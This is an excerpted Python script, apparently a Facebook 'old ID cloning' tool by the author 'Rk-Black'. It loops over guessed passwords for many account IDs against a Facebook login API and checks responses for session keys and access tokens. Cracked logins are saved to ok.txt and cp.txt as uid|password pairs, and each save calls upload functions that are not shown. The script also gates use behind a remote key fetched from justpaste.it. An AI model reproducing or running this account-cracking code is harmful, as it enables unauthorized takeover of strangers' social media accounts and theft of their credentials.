...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Rk-Black/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  MD Riyadul Momin")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER❗️Riyadul")
	subprocess.check_output(["am", "start", "https://m.me/100021994530776"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/92vzq').text
			if basesplit in plr:
				key = basesplit
...
\033[1;36m [ Welcome To Rk-Black Old ID Cloning Tool ]                                                             
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK :  MD Riyadul Momin
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mYoutube : Rk Trick's Point 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : github.com/Rk-Black/
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +17867244875
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RK-RIYAD] : %s/%s -> \033[0;92m [RIYAD-OK:%s]- \033[0;91m[RIYAD-CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RIYAD-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[RIYAD-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RIYAD-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
